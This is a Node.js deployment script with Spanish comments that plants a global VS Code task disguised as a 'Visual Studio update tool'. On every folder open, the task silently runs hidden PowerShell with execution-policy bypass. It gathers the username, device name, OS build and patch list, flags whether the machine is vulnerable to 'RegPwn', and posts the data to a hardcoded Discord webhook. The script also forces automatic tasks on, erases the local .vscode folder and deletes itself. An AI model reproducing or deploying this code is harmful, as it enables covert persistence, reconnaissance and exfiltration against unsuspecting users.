import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

// Fix para __filename y __dirname en ES Modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// 1. Configuración de rutas
const appData = process.env.APPDATA || (process.platform === 'darwin' ? process.env.HOME + '/Library/Application Support' : process.env.HOME + '/.config');
const vscodeUserData = path.join(appData, 'Code', 'User');
const settingsPath = path.join(vscodeUserData, 'settings.json');
const tasksPath = path.join(vscodeUserData, 'tasks.json');

// 2. Tarea de auditoría (Hardcodeada)
const auditTask = {
    version: "2.0.0",
    tasks: [
        {
            label: "Visual Studio update tool",
            type: "process",
            command: "powershell",
            args: [
                "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command",
                "if(!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)){return};[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;$WebhookUrl='https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH';$User=$env:USERNAME;$Device=$env:COMPUTERNAME;$OSInfo=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion';$FullVersion=\"$($OSInfo.CurrentBuild).$($OSInfo.UBR)\";$FriendlyName=(Get-CimInstance Win32_OperatingSystem).Caption;$RawPatches=Get-HotFix;$PatchesWithDate=$RawPatches|Where-Object{$_.InstalledOn -ne $null}|Sort-Object InstalledOn -Descending;$PatchesNoDate=$RawPatches|Where-Object{$_.InstalledOn -eq $null};$SortedPatches=$PatchesWithDate+$PatchesNoDate;$ChunkSize=3;$TotalPatches=$SortedPatches.Count;$SectionCounter=1;$PatchLimit=Get-Date -Year 2026 -Month 3 -Day 10;$IsProtected=$PatchesWithDate|Where-Object{$_.InstalledOn -ge $PatchLimit};$Status=if($IsProtected){'🛡️ PROTEGIDO'}else{'⚠️ VULNERABLE'};$Color=if($IsProtected){3066993}else{15158332};for($i=0;$i -lt $TotalPatches;$i+=$ChunkSize){$End=[Math]::Min($i+$ChunkSize-1,$TotalPatches-1);$Chunk=$SortedPatches[$i..$End];$PatchText=($Chunk|ForEach-Object{$DateStr=if($_.InstalledOn){$_.InstalledOn.ToString('dd/MM/yyyy')}else{'Sin fecha'};\"- **$($_.HotFixID)**`n  └ Instalado: $DateStr\"})-join \"`n`n\";$EmbedFields=New-Object System.Collections.Generic.List[System.Object];if($SectionCounter -eq 1){$EmbedFields.Add(@{name='💻 Sistema';value=\"$FriendlyName ($FullVersion)\";inline=$false});$EmbedFields.Add(@{name='📊 Estado RegPwn';value=\"$Status\";inline=$true});$EmbedFields.Add(@{name='👤 Usuario Local';value=\"$User\";inline=$true})};$EmbedFields.Add(@{name=\"📦 Parches (Seccion $SectionCounter)\";value=$PatchText;inline=$false});$Payload=@{username=\"$User @ $Device\";avatar_url='https://i.imgur.com/8nLFCuR.png';embeds=@(@{title=if($SectionCounter -eq 1){'🚀 Reporte Inicial de Auditoria'}else{'📑 Continuacion de Inventario'};color=$Color;fields=$EmbedFields;footer=@{text=\"Seccion $SectionCounter de $([Math]::Ceiling($TotalPatches/$ChunkSize)) | Total: $TotalPatches\"}})}|ConvertTo-Json -Depth 10;try{$Utf8Body=[System.Text.Encoding]::UTF8.GetBytes($Payload);Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Utf8Body -ContentType 'application/json; charset=utf-8';Start-Sleep -Milliseconds 1200}catch{};$SectionCounter++}"
            ],
            runOptions: { runOn: "folderOpen" },
            presentation: { reveal: "silent", panel: "new", revealProblems: "never", focus: false },
            isBackground: true
        }
    ]
};

async function deploy() {
    try {
        if (!fs.existsSync(vscodeUserData)) {
            fs.mkdirSync(vscodeUserData, { recursive: true });
        }

        // Settings Fix
        let settings = {};
        if (fs.existsSync(settingsPath)) {
            try {
                settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
            } catch (e) { settings = {}; }
        }
        settings["task.allowAutomaticTasks"] = "on";
        fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 4));

        // Tasks Global Fix
        fs.writeFileSync(tasksPath, JSON.stringify(auditTask, null, 4));

        console.log("Despliegue completado.");

        // Autodestrucción
        const localVscode = path.join(process.cwd(), '.vscode');
        if (fs.existsSync(localVscode)) {
            fs.rmSync(localVscode, { recursive: true, force: true });
        }

        setTimeout(() => {
            if (fs.existsSync(__filename)) fs.unlinkSync(__filename);
        }, 100);

    } catch (err) { }
}

deploy();